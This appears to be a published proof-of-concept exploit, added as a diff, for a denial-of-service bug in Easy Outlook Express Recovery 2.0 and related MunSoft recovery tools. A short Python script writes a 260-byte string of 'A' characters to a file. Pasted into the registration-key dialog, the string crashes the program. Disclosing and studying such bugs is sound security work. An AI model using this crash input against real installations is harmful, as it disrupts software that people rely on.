@@ -1,0 +1,46 @@
+# Exploit Title: Easy Outlook Express Recovery 2.0 - Denial of Service (PoC)
+# Dork: N/A
+# Date: 2018-11-15
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://www.munsoft.com/EasyOutlookExpressRecovery/
+# Software Link: https://s3.eu-central-1.amazonaws.com/munsoft-com-de/EasyOutlookExpressRecovery/download/EasyOutlookExpressRecovery-2.0-Setup.exe
+# Version: 2.0
+# Other Affectted Software:
+# Easy Outlook Recovery 2.0
+# Software Link: https://s3.eu-central-1.amazonaws.com/munsoft-com-de/EasyOutlookRecovery/download/EasyOutlookRecovery-2.0-Setup.exe
+# Easy Mail Recovery 2.0
+# Software Link: https://s3.eu-central-1.amazonaws.com/munsoft-com-de/EasyMailRecovery/download/EasyMailRecovery-2.0-Setup.exe
+# Easy Office Recovery 2.0
+# Software Link: https://s3.eu-central-1.amazonaws.com/munsoft-com-de/EasyOfficeRecovery/download/EasyOfficeRecovery-2.0-Setup.exe
+# Easy File Undelete 3.0
+# Software Link: https://s3.eu-central-1.amazonaws.com/munsoft-com-de/EasyFileUndelete/download/EasyFileUndelete-3.0-Setup.exe
+# Easy NTFS Data Recovery 3.0
+# Software Link: https://s3.eu-central-1.amazonaws.com/munsoft-com-de/EasyNTFSDataRecovery/download/EasyNTFSDataRecovery-3.0-Setup.exe
+# Easy FAT Data Recovery 3.0
+# Software Link: https://s3.eu-central-1.amazonaws.com/munsoft-com-de/EasyFATDataRecovery/download/EasyFATDataRecovery-3.0-Setup.exe
+# Easy Drive Data Recovery 3.0
+# Software Link: https://s3.eu-central-1.amazonaws.com/munsoft-com-de/EasyDriveDataRecovery/download/EasyDriveDataRecovery-3.0-Setup.exe
+# Easy Digital Photo Recovery 3.0
+# Software Link: https://s3.eu-central-1.amazonaws.com/munsoft-com-de/EasyDigitalPhotoRecovery/download/EasyDigitalPhotoRecovery-3.0-Setup.exe
+
+# Category: Dos
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# Help / Enter a registration key...
+
+#!/usr/bin/python
+    
+buffer = "A" * 260
+ 
+payload = buffer
+try:
+    f=open("exp.txt","w")
+    print "[+] Creating %s bytes evil payload." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created."
